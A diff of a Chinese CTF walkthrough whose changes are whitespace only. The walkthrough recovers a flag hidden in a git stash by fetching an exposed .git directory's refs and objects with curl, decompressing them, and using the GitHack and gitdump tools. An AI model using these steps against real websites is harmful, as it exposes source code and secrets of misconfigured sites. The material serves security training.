@@ -27,9 +27,9 @@ stash 是一个**特殊提交**，与普通提交有两处不同：
 
 ```
 stash 提交（refs/stash）
-  ├─ tree  ← 真 flag 文件在这里
-  ├─ parent 原分支 HEAD
-  └─ parent 暂存区快照
+ ├─ tree ← 真 flag 文件在这里
+ ├─ parent 原分支 HEAD
+ └─ parent 暂存区快照
 ```
 
 所以**真 flag 藏在 stash 的 tree 里**，而不是 add flag 提交的 tree 里。判断方向的方法见下。
@@ -48,7 +48,7 @@ curl -s "http://目标/.git/logs/HEAD"
 
 # 2. 关键：logs/refs/stash 暴露 stash 操作
 curl -s "http://目标/.git/logs/refs/stash"
-# 0000000... 97d4f58 WIP on master: 902a12e add flag  <-- 暴露 stash！
+# 0000000... 97d4f58 WIP on master: 902a12e add flag <-- 暴露 stash！
 ```
 
 `logs/refs/stash` 存在 = 仓库里藏了 stash。同时 `refs/stash` 文件内容就是 stash 提交的 sha1：
@@ -65,17 +65,17 @@ curl -s "http://目标/.git/refs/stash"
 ```bash
 # 1. stash 提交（97d4f58...）——看它的 tree 和双 parent
 curl -s "http://目标/.git/objects/97/d4f58456ebdc5635d57d19143e77575b1977d2" | python3 -c "import zlib,sys; print(zlib.decompress(sys.stdin.buffer.read()).decode())"
-# commit ... tree dfe63c27...    <-- stash 的 tree（真 flag 候选）
-# parent 902a12e...              <-- 原分支 HEAD
-# parent a983d7d...              <-- 暂存区快照
+# commit ... tree dfe63c27... <-- stash 的 tree（真 flag 候选）
+# parent 902a12e... <-- 原分支 HEAD
+# parent a983d7d... <-- 暂存区快照
 
 # 2. add flag 提交（902a12e...）的 tree——对比用
 curl -s "http://目标/.git/objects/90/2a12e..." | python3 -c "import zlib,sys; print(zlib.decompress(sys.stdin.buffer.read()).decode())"
-# tree c96cbca4...              <-- add flag 的 tree
+# tree c96cbca4... <-- add flag 的 tree
 
 # 3. 分别解析两个 tree 里的同名文件 blob
-#    add flag 的 tree c96cbca4... → blob e358b09f... → "where is flag"（占位符！）
-#    stash 的 tree dfe63c27...  → blob b294e836... → 真 flag
+# add flag 的 tree c96cbca4... → blob e358b09f... → "where is flag"（占位符！）
+# stash 的 tree dfe63c27... → blob b294e836... → 真 flag
 ```
 
 | 对象 | 内容 | 结论 |
@@ -97,11 +97,11 @@ curl -s "http://目标/.git/objects/90/2a12e..." | python3 -c "import zlib,sys; 
 gitdump "http://目标/" --out restore
 # [*] 日志: 5 次提交
 # [+] 提交历史:
-#     ...  init
-#     ...  add flag
-#     ...  reset: moving to HEAD
-#     ...  remove flag
-#     ...  stash: WIP on master: 902a12e add flag   <-- 探测到 stash
+# ... init
+# ... add flag
+# ... reset: moving to HEAD
+# ... remove flag
+# ... stash: WIP on master: 902a12e add flag <-- 探测到 stash
 # [+] 恢复文件: 228961921227229.txt ...
 # gitdump 检测到 stash 时优先恢复 stash 版本文件
 
@@ -117,15 +117,15 @@ git clone https://github.com/BugScanTeam/GitHack
 python3 GitHack.py "http://目标/.git/"
 # [+] Clone Success. Dist File : ./dist/目标
 # 注意：GitHack 按 index 恢复文件，得到的是占位符版本（"where is flag"）
-cat dist/目标/228961921227229.txt     # where is flag
+cat dist/目标/228961921227229.txt # where is flag
 
 # 2. 但完整 .git 已下载，在本地用 git 命令操作 stash
 cd dist/目标
 git stash list
-# stash@{0}: WIP on master: 902a12e add flag   <-- 真 flag 在此
+# stash@{0}: WIP on master: 902a12e add flag <-- 真 flag 在此
 git stash apply
 cat 228961921227229.txt
-# ctfhub{17e3c1c94c62c72c904715f7}            <-- 真 flag
+# ctfhub{17e3c1c94c62c72c904715f7} <-- 真 flag
 ```
 
 解法三（手工对象链，理解原理）：
@@ -133,7 +133,7 @@ cat 228961921227229.txt
 ```bash
 # 1. 确认 stash 存在，拿 sha1
 curl -s "http://目标/.git/logs/refs/stash"
-curl -s "http://目标/.git/refs/stash"     # 97d4f58456ebdc5635d57d19143e77575b1977d2
+curl -s "http://目标/.git/refs/stash" # 97d4f58456ebdc5635d57d19143e77575b1977d2
 
 # 2. 解压 stash 提交 → 拿 tree（dfe63c27...）
 curl -s "http://目标/.git/objects/97/d4f58456ebdc5635d57d19143e77575b1977d2" | python3 -c "import zlib,sys; print(zlib.decompress(sys.stdin.buffer.read()).decode())"
